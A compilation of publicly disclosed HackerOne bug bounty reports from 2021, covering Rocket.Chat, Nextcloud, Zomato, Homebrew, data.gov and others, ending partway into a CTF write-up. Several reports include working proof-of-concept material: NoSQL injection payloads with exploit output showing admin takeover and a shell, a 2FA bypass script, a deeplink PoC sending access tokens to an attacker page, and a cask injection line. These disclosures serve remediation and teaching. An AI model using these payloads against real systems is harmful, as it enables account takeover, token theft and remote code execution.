### [Authentication Bypass - Email Verification code bypass in account registration process.](https://hackerone.com/reports/1406471)

- **Report ID:** `1406471`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** UPchieve
- **Reporter:** @anas_44
- **Bounty:** - usd
- **Disclosed:** 2021-12-07T18:57:19.042Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Team,

I was able to bypass Email Verification code in account registration process.

Summary :
Authentication Bypass is a dangerous vulnerability, which is found in Web-Applications. An Attackers can bypass the control mechanisms which are used by the underlying web application like Email verification, OTP, Captcha, 2FA, etc. An Attacker can perform a  complete Account takeover of Victim.

Severity :   High / Critical

Complexity : Easy 

From : Remote / External

Steps to Reproduce:

1- First visit your website "https://hackers.upchieve.org" and request for the sign up.
2- In the second step, choose either you want to register as an academic coach or need an academic coach.
3- In the third step, enter your email and create a password.
4- In the fourth step, enter name and mobile phone, then sign up.
5- Then request for verification code on email.
6- Enter wrong verification code and intercept request using Burp suite.
7- After intercepting the request, I changed the status from "False" to "True".
          {"status":false to "status":true}
8- Boom!! Verification code bypassed.
9- Finally, the account was created with the wrong verification code.


Proof of Concept : 
For better understanding, I have attached screenshots and videos after intercepting the request from Burp Suite.

Recommendations :
The application should protect the sensitive actions and validate the verification process of the web application. Restrict the user for any malicious behavior. 

References:
https://hackerone.com/reports/1040047
https://hackerone.com/reports/57764
https://medium.com/@AGNIHACKERS/otp-bypass-through-response-manipulation-beeb467359d8

## Impact

An Adversary can carry out Auth Bypass attack and perform an Account Take Over. An attacker can succeed in the account takeover of any user without any privileges.

---

### [Загружаем видеозаписи в основной альбом любой открытой группе/паблику.](https://hackerone.com/reports/508506)

- **Report ID:** `508506`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** VK.com
- **Reporter:** @executor
- **Bounty:** 300 usd
- **Disclosed:** 2021-11-05T16:17:41.873Z
- **CVE(s):** -

**Summary (team):**

Недостаточные проверки при загрузке видеозаписей.

---

### [Reflected XSS в m.vk.com](https://hackerone.com/reports/311913)

- **Report ID:** `311913`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** VK.com
- **Reporter:** @executor
- **Bounty:** 500 usd
- **Disclosed:** 2021-11-05T16:06:23.712Z
- **CVE(s):** -

**Summary (team):**

XSS в поиске по карте.

---

### [Unauthorized Kubernetes to RCE (root) and found TEAMTNT Crypto Miner on it](https://hackerone.com/reports/1317236)

- **Report ID:** `1317236`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** IBM
- **Reporter:** @un_kn0wn
- **Bounty:** - usd
- **Disclosed:** 2021-10-18T19:30:32.486Z
- **CVE(s):** -

**Summary (team):**

This report revealed a vulnerable server running an unauthorized Kubernetes which allowed un_kn0wn to gain remote code execution. This issue was reported to IBM and has been remediated.

---

### [[Zomato Order] Insecure deeplink leads to sensitive information disclosure](https://hackerone.com/reports/532225)

- **Report ID:** `532225`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Eternal
- **Reporter:** @shell_c0de
- **Bounty:** 750 usd
- **Disclosed:** 2021-09-23T05:54:00.030Z
- **CVE(s):** -

**Vulnerability Information:**

Hello, i want to report the vulnerability found,
Since the following activity `com.application.zomato.activities.DeepLinkRouter` has `exported="true"` it can be exploited by another application.

###Application Information

Application: [Zomato Order - Food Delivery App](https://play.google.com/store/apps/details?id=com.application.zomato.ordering)
Package Name: `com.application.zomato.ordering`
Version: `5.6.4`
Version Status: Last
Vulnerable class: `com.application.zomato.activities.DeepLinkRouter`

###Vulnerability

Using a special intent, you can send the access tokens to a malicious site.
```java
Follow the code
public class com.application.zomato.activities.DeepLinkRouter extends BaseAppCompactActivity {
public void onCreate(Bundle arg4) {
        super.onCreate(arg4);
        this.setContentView(0x7F0B04D2);
 if((TextUtils.isEmpty(this.c)) && this.getIntent() != null && this.getIntent().getAction() != null && ("android.intent.action.VIEW".equals(this.getIntent().getAction()))) {
            this.c = this.getIntent().getData().toString();
        }
        this.e(this.c);// getting zomatodelivery://etc URL
//..
private void e(String arg11) {
v0 = Uri.parse(arg11);
            if(!"zomato".equals(v0.getScheme()) && !"zomatodelivery".equals(v0.getScheme())) {
                return;
            }
            v1 = v0.getHost();
 if("zloyaltywebview".equals(v1)) {
                            if(TextUtils.isEmpty(v0.getQueryParameter("url"))) {
                                goto label_1496;
                            }
                            if(v0.getQueryParameter("navigation_bar_type") != null) {
                                if(!v0.getQueryParameter("navigation_bar_type").equalsIgnoreCase("transparent")) {
                                }
                                else {
                                    this.a(v0);//without check host
                                    goto label_1496;
                                }
                            }

                            this.g(v0);//with check host
                            goto label_1496;
//..
   private void a(Uri arg4) {
        String v0 = arg4.getQueryParameter("header_title");
        String v4 = arg4.getQueryParameter("url") != null ? arg4.getQueryParameter("url") : "";
        this.a(new Intent[]{WebViewActivity.newIntent(((Context)this), v4, v0, false)});//loadUrl
    }
```
Host check missing.
###PoC:
Java PoC:
```java
  Intent intent = new Intent("android.intent.action.VIEW");
  intent.setData(Uri.parse("zomatodelivery://zloyaltywebview/?url=██████████sniffer.php&navigation_bar_type=transparent"));
  startActivity(intent);
```
Payload: ████████
███████

HTML PoC:
```html
<a href="zomatodelivery://zloyaltywebview/?url=████sniffer.php&navigation_bar_type=transparent">Send token Zomato</a>
```
████
Payload: █████████zomato.html

###Fix
Check the host before load to WebView, your regular check in CommonLib works fine.

## Impact

1) Leakage of access tokens to arbitrary sites
2) XSS/Ability of open arbitrary sites in your internal WebView

---

### [SSH server due to Improper Signature Verification](https://hackerone.com/reports/1294043)

- **Report ID:** `1294043`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Sifchain
- **Reporter:** @escanor56
- **Bounty:** - usd
- **Disclosed:** 2021-08-30T14:35:11.432Z
- **CVE(s):** CVE-2020-9283

**Vulnerability Information:**

I found that you are using golang.org/x/crypto@v0.0.0-20201016220609-9e8e0b390897 which has a vulnerability that was fixed in this version 
golang.org/x/crypto@0.0.0-20201203163018-be400aefbc4c but that vulnerability is:
golang.org/x/crypto/ssh is an SSH client and server
Version v0.0.0-20200220183623-bac4c82f6975 of golang.org/x/crypto fixes a vulnerability in the golang.org/x/crypto/ssh package which allowed peers to cause a panic in SSH servers that accept public keys and in any SSH client.
You can check all of the info here with this CVE: CVE-2020-9283.

## Impact

An attacker can craft an ssh-ed25519 or sk-ssh-...@openssh.com public key, such that the library will panic when trying to verify a signature with it. Clients can deliver such a public key and signature to any golang.org/x/crypto/ssh server with a PublicKeyCallback, and servers can deliver them to any golang.org/x/crypto/ssh client.

---

### [Two-factor authentication enforcement bypass](https://hackerone.com/reports/1050244)

- **Report ID:** `1050244`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Nextcloud
- **Reporter:** @abdullah-a
- **Bounty:** 750 usd
- **Disclosed:** 2021-07-31T14:05:14.810Z
- **CVE(s):** -

**Vulnerability Information:**

the attacker could bypass the two-factor authentication enforcement

[ Steps to reproduce ]
1. Login with an Administrator account.
2. Click on your administrator profile icon.
3. Users -> Add group -> group name: Enforcement.
4. New User -> Username: Bypass -> Password: NextCloudEnforcement -> Add User in group -> Enforcement.
5. Click on your administrator profile icon.
6. Settings -> Administration label -> Security -> Two-Factor Authentication -> Enforcement of two-factor authentication can be set for certain groups only. Two-factor authentication is enforced for all members of the following groups. -> Add Enforcement group.
7. Save changes.
8. Logout.
9. Login with Username: Bypass and Password: NextCloudEnforcement the response msg is Two-factor authentication is enforced but has not been configured on your account. Contact your admin for assistance.
10. Login with Username: Bypass and Password: NextCloudEnforcement with another session.
11. replace the oc_sessionPassphrase token with the first oc_sessionPassphrase session.
12. then you have bypassed the two factor authentication enforcement.

[Code]
python script just change the domain to your domain and save as bypass.py
```
#!/usr/bin/python3
# python3 -m pip install requests beautifulsoup4
# python3 bypass.py
from requests import Session
from bs4 import BeautifulSoup

class NextCloud(object):
    def __init__(self, baseURL):
        self.session = Session()
        self.baseURL = baseURL

    def login(self, data):
        response = self.session.get(f'{self.baseURL}/login')
        soup = BeautifulSoup(response.text, 'html.parser')
        data.update({
            'requesttoken': soup.find('head')['data-requesttoken']
        })
        self.session.post(f'{self.baseURL}/login', data = data)
    
    def getCookies(self):
        return self.session.cookies.get_dict()

if __name__ == '__main__':
    baseURL = 'http://nextcloud.diefunction.local'
    data = {
        'user': 'bypass',
        'password': 'NextCloudEnforcement'
    }
    firstSession = NextCloud(baseURL)
    secondSession = NextCloud(baseURL)
    firstSession.login(data)
    secondSession.login(data)
    cookies = firstSession.getCookies()
    cookies['oc_sessionPassphrase'] = secondSession.getCookies()['oc_sessionPassphrase']
    print(f'[Cookies] {cookies}') # change your browser cookies to bypass enforcement
```
change the browser cookies to the script output cookies

[ why its worked ]
I tried to understand why it's worked but I didn't found any reason for that
https://github.com/nextcloud/server/blob/1762a409f954fd9a66e7572704ea9ba7813601b4/core/templates/twofactorselectchallenge.php

[Discovered by]
Abdullah Alharbi @Eng_Abdullahx0
Rayan Althobaiti @Diefunction

Note: if this is an eligible bug please provide a CVE.

## Impact

the attacker can gain access to the user dashboard if the user account is enforced with two-factor authentication

---

### [Post-Auth Blind NoSQL Injection in the users.list API leads to Remote Code Execution](https://hackerone.com/reports/1130874)

- **Report ID:** `1130874`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Rocket.Chat
- **Reporter:** @sonarsource
- **Bounty:** - usd
- **Disclosed:** 2021-07-31T08:31:05.616Z
- **CVE(s):** CVE-2021-22910

**Vulnerability Information:**

**Summary:**
The `users.list` API endpoint is vulnerable to NoSQL injection attacks. It can be used to take over accounts by leaking password reset tokens and 2FA secrets. Taking over an admin account leads to Remote Code Execution.

**Description:**
The `users.list` API endpoint takes a custom query via the `query` URL query parameter. Although the returned fields are restricted, the query is not validated or sanitized properly and can thus be used to perform a blind NoSQL injection that can leak any field's value of any document in the `users` collection.

By using [MongoDB's `$where` operator](https://docs.mongodb.com/manual/reference/operator/query/where/), an attacker can build arbitrary oracles that can leak the value of any field of any user document. The query can be tailored to leak only the values of a specific account which makes it easy to target an admin account. Most notably an attacker can leak password reset tokens and 2FA secrets.

Example: in order to check if the password reset token of an admin user begins with a specific letter, e.g. `A`, the attacker would send the JSON object `{"$where":"this.roles.includes('admin') && /^A/.test(this.services.password.reset.token)"}` as the `query` parameter. The response contains the matching admin user when the guess was correct, or no users otherwise. This can be repeated for all possible characters and for each position in the token, until the whole token is known. See the `users_nosqli_blind_leak` function in the attached exploit for an implementation of this.

In order to take over another account, an attacker would perform the following high-level steps:
1. Leak the user's email address
1. Request a password reset for the target user's account
1. Leak the password reset token
1. Leak the TOTP 2FA secret or email 2FA token hash if necessary
1. Reset the target user's password to an attacker known one using the password reset token and any leaked 2FA tokens/secrets if necessary

To gain Remote Code Execution capabilities on the server, an attacker can follow these steps to take over an admin account. The attacker can then use the newly gained admin privileges to create an incoming web hook that has a script. This allows them  to execute commands or get a shell on the server, because the script is executed on the server without a security boundary in place (which seems to be intended).

The vulnerable code can be found here: [users.js:230](https://github.com/RocketChat/Rocket.Chat/blob/eba1e9b3146e5102baed000953c2cb51930c345c/app/api/server/v1/users.js#L230-L237)

See `post_auth_nosqli.py` for a reference exploit and the attached video for a demonstration of it.

## Releases Affected:
- Tested on 3.12.1
- Seems to be affected since 0.49.0 as the vulnerability was introduced in [commit 3112d22](https://github.com/RocketChat/Rocket.Chat/commit/3112d225fe1533dd77cfad7fff085d53d78c19f2#diff-84949efc4b8041a5ac51e7bcd0f2cd38b8fd3690f059235769ab437b453feab8R120)

## Steps To Reproduce (from initial installation to vulnerability):
1. Install Python3 (required by the exploit)
1. Install the Python dependencies required by the exploit: `pip3 install requests bcrypt`
1. Set up an instance of RocketChat 3.12.1, e.g. by cloning the repo and using Docker Compose:
  1. `git clone git@github.com:RocketChat/Rocket.Chat.git`
  1. `cd Rocket.Chat`
  1. `git checkout tags/3.12.1`
  1. `docker-compose up -d`
1. Configure the instance with default settings
1. Create a normal (non-admin) user with username `attacker` and password `attacker`
1. Run the reference exploit against the instance: `python3 post_auth_nosqli.py -u attacker -p attacker 'http://localhost:3000'`
1. The exploit should provide an interactive shell on the the server, use it to verify that you can execute commands as the rocketchat user: `whoami`

## Supporting Material/References:
The attached proof-of-concept video shows the setup and exploitation of a fresh Rocket.Chat instance.
**Please note:** The unsuccessful login at the end of the video does not mean that the exploit did not work, it just shows that the original admin password was restored (as stated in the exploits output). The exploit was successful, which can be seen by the output of the shell commands at the end of the exploit.

This is the exploit's output:
```
 ___  ___  _ __   __ _ _ __ ___  ___  _   _ _ __ ___ ___ 
/ __|/ _ \| '_ \ / _` | '__/ __|/ _ \| | | | '__/ __/ _ \
\__ \ (_) | | | | (_| | |  \__ \ (_) | |_| | | | (_|  __/
|___/\___/|_| |_|\__,_|_|  |___/\___/ \__,_|_|  \___\___|

[+] Found admin: username=admin id=56gyPQKt8Ff3Weowk
[*] Leaking email...
[+] Leaked email: admin@rocketchat.local
[*] Leaking password hash...
[+] Leaked password hash: $2b$10$ubhEIM/j6qLFNINHVbP.B.CJFCXagK7V5zD0Q8BYzs6UBlbBpiECa
[+] Requesting password reset...
[*] Leaking password reset token...
[+] Leaked password reset token: ET4sx905cF9pTZOsHFu6eRad7MwpYmqs-iTMWQIXAhv
[+] Resetting password to "DEbCf2b0A2BE79bBcDf1"...
[+] Admin account takeover successful!
[+] Creating hook "backdoor-9Fbd6E5A" with secret "AbE217B9d9e7Dd0CB2EB8dd30d26edfe"...
[*] Hook: 7bgxdkGHQYdBwtHWA/2S3EGB2ywWHM3aeYKu2q7akGF6TEjXEKMGK2Smggw7LpSLHc
[+] Restoring admin password...
[+] Dropping into shell:
$ whoami
rocketchat
$ id
uid=65533(rocketchat) gid=65533(rocketchat) groups=65533(rocketchat)
$ 
```

## Suggested mitigation
- Properly validate the `query` parameter:
  - Restrict the usage of MongoDB operators using an allowlist, especially top level operators like `$where`
  - Restrict the set of query-able fields using an allowlist (like the restriction on the returned fields)
- Check every API endpoint that uses the `parseJsonQuery()` function for similar vulnerabilities

## Disclosure Policy
All reported issues are subject to a 90 day disclosure deadline. 
After 90 days elapse, parts of the bug report will become visible to the public.

Don't hesitate to ask if you have any questions or need further help with this issue.

## Impact

An attacker can use this vulnerability to target an admin user and take over their account, which is already a high impact. The attacker can then use certain features that are available to admins in order to gain Remote Code Execution capabilities. This is demonstrated in the reference exploit by creating an incoming web hook that executes the attacker's payload in the context of the server process.

This gives them complete control over the Rocket.Chat instance and exposes all attached components, e.g. the database or any external system whose credentials are stored within Rocket.Chat settings. An attacker can read, change, or delete all items in the database, impacting confidentiality, integrity, and availability.

---

### [Github access token exposure](https://hackerone.com/reports/1087489)

- **Report ID:** `1087489`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Shopify
- **Reporter:** @augustozanellato
- **Bounty:** 50000 usd
- **Disclosed:** 2021-07-26T19:50:02.320Z
- **CVE(s):** -

**Vulnerability Information:**

While dissecting an application made by one of your employees I found his GitHub Personal Access Token (PAT), he's a member of the org with pull and push access to all of your repositories. 
As a proof I can tell you that on the repo github.com/Shopify/shopify at commit hash `cea9c273391d` the sha512 of the README.md is `69750574bec56c1f1052db3471252b1daacdc9dda9f6d5332a3400a847fa413ec1caf19ef0b5501f18a5a76c232e7210d5f3b91c24c9439f4e0f64c02d6db824`.

## Impact

Read and write access to all your private github repositories.

**Summary (team):**

On January 26, @augustozanellato reported that while reviewing a public MacOS app, they found a valid GitHub Access Token belonging to a Shopify employee. This token had read and write access to Shopify-owned GitHub repositories. Upon validating the report, we immediately revoked the token and performed an audit of access logs to confirm no unauthorized activity had occurred.

**Summary (researcher):**

I was reviewing an Electron app made by one of Shopify employees (at the time I didn't know that Shopify was in any way involved), after extracting the `app.asar` file using `npx asar extract path/to/app.asar extracted/path` I found a `.env` file, initially I skipped it because I thought it just contained some app configuration stuff but after taking a look at the source it was clear that the app never loaded it. It was probably a leftover of the release building process.
That `.env` contained a `GH_TOKEN` variable, which is (as you can probably guess) a GitHub token, I tried using it to authenticate against GitHub REST API using `curl -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github.v3+json" https://api.github.com/user`, I saw that the token was indeed valid so I decided to hit the `/user/orgs` API endpoint and I got back (among others) the Shopify organization, then I hit the `/orgs/Shopify/repos` endpoint to confirm the GitHub token scope and I successfully got back a list containing both Shopify public and private repos with `"permissions": {"admin": false, "push": true, "pull": true}` so at that point I knew that the token was enabling me to perform arbitrary push and pulls to Shopify repos so potentially permitting me to place backdoors and such.

---

### [Prototype Pollution Vulnerability in noble Package](https://hackerone.com/reports/390857)

- **Report ID:** `390857`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Node.js third-party modules
- **Reporter:** @cris_semmle
- **Bounty:** - usd
- **Disclosed:** 2021-06-28T08:38:57.213Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report prototype pollution vulnerability in noble.
It allows attackers to pollute the Object.prototype object of an application running noble, possibly through Bluetooth.

# Module

**module name:** noble
**version:** 1.9.1
**npm page:** `https://www.npmjs.com/package/noble`

## Module Description

A Node.js BLE (Bluetooth Low Energy) central module.
Want to implement a peripheral? Checkout bleno
Note: macOS / Mac OS X, Linux, FreeBSD and Windows are currently the only supported OSes. Other platforms may be developed later on.

## Module Stats

2,270 downloads in the last week

# Vulnerability

## Vulnerability Description
An attacker can inject arbitrary properties on Object.prototype using one of the methods exposed by this module. Moreover, there is strong evidence (parameter names) to believe that these values can be controlled remotely by the attacker, through Bluetooth.

## Steps To Reproduce:

For now, I only have a local payload, but it seems to me that both the peripheralUuid and serviceUuids, expected by the onServicesDiscover are specified in the Bluetooth standard, thus it may come from another device advertising itself over Bluetooth. However, this scenario needs to be investigated further. 

```js
var noble = require('noble');
//noble.emit("servicesDiscover");
console.log({}.x);
try {
    noble.onServicesDiscover("__proto__", "x");
} catch(e) {}
console.log({}.x);
```

## Patch

N/A validate the property name or initialize the target object using Object.create(null).

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

If the attack can indeed by deployed using Bluetooth, this issue is serious, allowing the attacker to inject arbitrary properties from a remote device.

---

### [Denial of service via cache poisoning on https://www.data.gov/](https://hackerone.com/reports/942629)

- **Report ID:** `942629`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** GSA Bounty
- **Reporter:** @kq8dq
- **Bounty:** - usd
- **Disclosed:** 2021-06-15T19:42:54.864Z
- **CVE(s):** -

**Vulnerability Information:**

An attacker can persistently block access to any on https://www.data.gov/ by using cache poisoning with the h0st headers to cause
502 response code。

To replicate:
load https://www.data.gov/ in your browser.
look the burp ,  add ?xyzxyz=1 as cache buster , and add h0st headers h0st: wrtqvavjigwdvoqk in your burp.
load https://www.data.gov/?xyzxyz=1 in your browser. again.
and you win see 502 ERROR

{F922984}

To be more clearer, see my video
{F922983}

my http request：

```
GET /?xyzxyz=1 HTTP/1.1
Host: www.data.gov
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
h0st: wrtqvavjigwdvoqk
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

```


For more information on the theory behind this attack, check out https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning

Similar report：
https://hackerone.com/reports/622122
https://hackerone.com/reports/409370

## Impact

An attacker can persistently block access to any on https://www.data.gov/

---

### [Pre-Auth Blind NoSQL Injection leading to Remote Code Execution](https://hackerone.com/reports/1130721)

- **Report ID:** `1130721`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Rocket.Chat
- **Reporter:** @sonarsource
- **Bounty:** - usd
- **Disclosed:** 2021-05-18T20:36:02.110Z
- **CVE(s):** CVE-2021-22911

**Vulnerability Information:**

**Summary:**
The `getPasswordPolicy` method is vulnerable to NoSQL injection attacks and does not require authentication/authorization. It can be used to take over accounts by leaking password reset tokens. Taking over an admin account leads to Remote Code Execution.

**Description:**
The `getPasswordPolicy` method does not properly validate or sanitize the `token` parameter and can thus be used to perform a blind NoSQL injection. It can be called without authentication (which seems intended), e.g. by using the `/api/v1/method.callAnon` API endpoint

By using [MongoDB's `$regex` operator](https://docs.mongodb.com/manual/reference/operator/query/regex/), a password reset token can be leaked character by character. Example: in order to check if the password reset token begins with a specific letter, e.g. `A`, the attacker would send the JSON object `{"$regex":"^A"}` as the `token` parameter. The response contains the server's password policy when the guess was correct, or an error otherwise. This can be repeated for all possible characters and for each position in the token, until the whole token is known. See the `pwpolicy_leak_token` function in the attached exploit for an implementation of this.

In order to take over an account, an attacker would perform the following high-level steps:
1. Request a password reset for the target user's account. This requires the attacker to know the target user's email address.
1. Leak the password reset token as explained above
1. Reset the target user's password to an attacker known one using the password reset token. The target user cannot have email or TOTP 2FA enabled in order for this step to work.

To gain Remote Code Execution capabilities on the server, an attacker can follow these steps to take over an admin account. The attacker can then use the newly gained admin privileges to create an incoming web hook that has a script. This allows them  to get execute commands or get a shell on the server, because the script is executed on the server without a security boundary in place (which seems to be intended).

See `pre_auth_nosqli.py` for a reference exploit and the attached video for a demonstration of it.

The vulnerable code can be found here: [getPasswordPolicy.js:8](https://github.com/RocketChat/Rocket.Chat/blob/eba1e9b3146e5102baed000953c2cb51930c345c/server/methods/getPasswordPolicy.js#L8)

## Releases Affected:
- Tested on 3.12.1
- Seems to be affected since 3.8.0 as the vulnerability was introduced in [commit b950f17](https://github.com/RocketChat/Rocket.Chat/commit/b950f17e4225efb99b7b80022877f9b2cdf14b64?branch=b950f17e4225efb99b7b80022877f9b2cdf14b64#diff-2fc491cc6f1ca015c2e3f7c36ee12f8d7c7e40907257fd5256d3f39e85c12b88R8)

## Steps To Reproduce (from initial installation to vulnerability):
1. Install Python3 (required by the exploit)
1. Install the Python dependencies required by the exploit: `pip3 install requests`
1. Set up an instance of RocketChat 3.12.1, e.g. by cloning the repo and using Docker Compose:
  1. `git clone git@github.com:RocketChat/Rocket.Chat.git`
  1. `cd Rocket.Chat`
  1. `git checkout tags/3.12.1`
  1. `docker-compose up -d`
1. Configure the instance with default settings, remember the admin's email address (e.g. `admin@rocketchat.local`)
1. Disable all 2FA methods on the admin account
1. Run the reference exploit against the instance, provide the admin's email address: `python3 pre_auth_nosqli.py 'http://localhost:3000' 'admin@rocketchat.local'`
1. The exploit should provide an interactive shell on the the server, use it to verify that you can execute commands as the rocketchat user: `whoami`

## Supporting Material/References:
The attached proof-of-concept video shows the setup and exploitation of a fresh Rocket.Chat instance.
This is the exploit's output:
```
 ___  ___  _ __   __ _ _ __ ___  ___  _   _ _ __ ___ ___ 
/ __|/ _ \| '_ \ / _` | '__/ __|/ _ \| | | | '__/ __/ _ \
\__ \ (_) | | | | (_| | |  \__ \ (_) | |_| | | | (_|  __/
|___/\___/|_| |_|\__,_|_|  |___/\___/ \__,_|_|  \___\___|

[+] Requesting password reset for "admin@rocketchat.local"...
[*] Leaking password reset token...
[+] Leaked password reset token: 0q9oakr3Lc94p3AnUjtQGlBm4bqJF3AndFYOjIg94ld
[+] Resetting password to "f7c87ed1559f2fe101ee"...
[+] Admin account takeover successful!
[+] Creating hook "backdoor-8624225d" with secret "8e2b809f6d1e9c561f9625d362726672"...
[*] Hook: T4nRot8nRvgEDp6rn/6sfs8GYcZCmH7SjKeazsexGmCJjFdLwWMdsqyz9hTcPFYxKF
[+] Dropping into shell:
$ whoami
rocketchat
$ id
uid=65533(rocketchat) gid=65533(rocketchat) groups=65533(rocketchat)
$ 
```

## Suggested mitigation
Ensure that the user-provided `token` parameter is a string.

## Disclosure Policy
All reported issues are subject to a 90 day disclosure deadline. 
After 90 days elapse, parts of the bug report will become visible to the public.

Don't hesitate to ask if you have any questions or need further help with this issue.

## Impact

An attacker can use this vulnerability to target an admin user and take over their account, which is already a high impact. The attacker can then use certain features that are available to admins in order to gain Remote Code Execution capabilities. This is demonstrated in the reference exploit by creating an incoming web hook that executes the attacker's payload in the context of the server process.

This gives them complete control over the Rocket.Chat instance and exposes all attached components, e.g. the database or any external system whose credentials are stored within Rocket.Chat settings. An attacker can read, change, or delete all items in the database, impacting confidentiality, integrity and availability.

---

### [User enumeration through forget password](https://hackerone.com/reports/1166054)

- **Report ID:** `1166054`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** UPchieve
- **Reporter:** @aousho9887
- **Bounty:** - usd
- **Disclosed:** 2021-05-16T01:59:36.203Z
- **CVE(s):** -

**Vulnerability Information:**

Vulnerability:-
->User enumeration is possible through forgot password feature.
steps to reproduce:-
->Go to the above selected domain and go to forgot password.
->submit random email and then intercept request  by burp suit 
->in response you will get { HTTP/1.1 500 Internal Server Error with {{"err":"No account with that id found."} } 

Remediation:-
->It should display like "if that mail address exists in our system, then we will send password reset link."
I hope that you will consider this issue as you also welcome the reports of best practices.
Thank you

## Impact

Leaking users' emails. / Information Disclosure.

---

### [Broken parsing of Git diff allows an attacker to inject arbitrary Ruby scripts to Casks on official taps](https://hackerone.com/reports/1167608)

- **Report ID:** `1167608`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Homebrew
- **Reporter:** @ryotak
- **Bounty:** - usd
- **Disclosed:** 2021-04-21T11:24:49.165Z
- **CVE(s):** -

**Vulnerability Information:**

## Description
Due to improper parsing of Git diff in [Homebrew/actions/review-cask-pr](https://github.com/Homebrew/actions/tree/336bd2aae5314f8c17c66a8319adeba99f13c093/review-cask-pr), it's possible to confuse parser to ignore additional lines.
Which leads injection of malicious Ruby scripts.

## Root cause
`review-cask-pr` uses the git diff file to check if the pull request is "simple" enough to automatically merge it.
To parse the git diff file, it uses [`git_diff`](https://github.com/anolson/git_diff/) gem with some modifications.
https://github.com/Homebrew/actions/blob/master/review-cask-pr/git_diff_extension.rb
Since `git_diff` has a small bug that allows a crafted diff file to confuse additions as a `a_path`, it's possible to confuse `review-cask-pr`.
https://github.com/anolson/git_diff/blob/21913c2a51661449a7250cc3a5ba5f5f4f128959/lib/git_diff/file.rb#L61-L62

## Steps to reproduce
1. Fork [Homebrew/homebrew-cask](https://github.com/Homebrew/homebrew-cask).
2. Modify a cask file to add following lines:
```ruby
++ "b/#{puts 'Going to report it - RyotaK (https://hackeorne.com/ryotak)';b = 1;Casks = 1;iterm2 = {};iterm2.define_singleton_method(:rb) do 1 end}"
++ b/Casks/iterm2.rb
```
3. Open a pull request on [Homebrew/homebrew-cask](https://github.com/Homebrew/homebrew-cask).
4. BrewTestBot will approve these changes.

https://github.com/Homebrew/homebrew-cask/pull/104191

## Impact

Injected script will be evaluated once someone installed the cask, which may allows remote code execution.

**Summary (team):**

https://brew.sh/2021/04/21/security-incident-disclosure/

**Summary (researcher):**

https://blog.ryotak.me/post/homebrew-security-incident-en/

---

### [Reflected XSS on https://www.uber.com ](https://hackerone.com/reports/390386)

- **Report ID:** `390386`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Uber
- **Reporter:** @samux
- **Bounty:** - usd
- **Disclosed:** 2021-03-15T19:58:23.761Z
- **CVE(s):** -

**Summary (team):**

By getting an authenticated victim to visit a malicious website, an attacker can cause that victim to execute arbitrary JavaScript in the context of the uber.com domain.

**Summary (researcher):**

More details here: 

https://medium.com/@saamux/applying-a-small-bypass-to-steal-facebook-session-tokens-in-uber-5b9638b7a18c

---

### [hackyholidays CTF Writeup](https://hackerone.com/reports/1069080)

- **Report ID:** `1069080`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @un5h4d0w
- **Bounty:** - usd
- **Disclosed:** 2021-03-02T17:48:28.081Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

As per [the referenced blog entry](https://www.hackerone.com/blog/12-days-hacky-holidays-ctf), the Grinch has gone hi-tech this year with the intentions of ruining the holidays. The challenge was about infiltrating the Grinch's network and take it down. 

As outlined on https://hackerone.com/h1-ctf, the domain `hackyholidays.h1ctf.com` was in scope.

It was possible to find multiple vulnerabilities, exploit various applications of the Grinch and finally turn the Grinch's own attack servers against himself by issuing a DDOS attack to `127.0.0.1` and knock him off the internet.

I hope that rebuilding his infrastructure keeps the Grinch busy for a while and gives hackers a chance to prepare for next year.

## Steps To Reproduce:

## Flag 1 - Flag leak in `/robots.txt`

Getting flag 1 was pretty easy - visiting `https://hackyholidays.h1ctf.com/robots.txt` gave away the first flag, `flag{48104912-28b0-494a-9995-a203d1e261e7}`:

{F1138900}

## Flag 2 - Secret Area

When visiting `https://hackyholidays.h1ctf.com/s3cr3t-ar3a`, the following text was shown:

{F1138914}

The grinch does not want us to see the page, but maybe we can bypass his protections...

I tried to manipulate the HTTP request as follows without success:

* Using `127.0.0.1` as value of the `Host` header 
* Adding the headers `X-Originating-IP`,` X-Forwarded-For`, `X-Remote-IP` and `X-Remote-Addr`
* Adding cookies: I used `access=1` and `acess=true`

First I didn't pay attention to the included scripts because they looked pretty standard according to their name, only JQuery and Boostrap seemed to be included. However, after running out of options, I took a closer look and noticed some strange content inside `https://hackyholidays.h1ctf.com/assets/js/jquery.min.js`:

{F1138928}

This looks a lot like a flag, and indeed, after copy-pasting the variable declaration into the debugger and printing the value gets added as `data-info` attribute to the element with ID `alertbox` I got the flag, `flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`.

{F1138929}

The JavaScript tells us also that the next challenge might be available under `/apps` as soon at is released.

## Flag 3 - People Rater

**App description**: "The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!"

